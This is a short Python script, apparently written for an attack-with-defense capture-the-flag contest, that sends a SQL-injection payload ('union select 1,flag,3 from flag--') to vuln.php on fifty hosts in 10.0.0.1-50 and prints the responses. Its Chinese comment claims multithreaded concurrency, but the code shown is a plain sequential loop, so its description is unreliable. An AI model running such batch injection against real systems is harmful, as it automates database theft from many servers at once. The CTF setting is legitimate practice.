import requests

'''
AWD竞赛中需要同时攻击多个队伍（10-50个靶机）
关键技术：多线程并发（threading）、超时控制、异常处理
实战效果：30秒内完成50个靶机的批量攻击
'''
targets = [f"10.0.0.{i}" for i in range(1, 51)]
for target in targets:
        url = f"http://{target}/vuln.php?id=1' union select 1,flag,3 from flag--"
        try:
            r = requests.get(url, timeout=3)
            print(f"{target}: {r.text}")
        except:
            pass
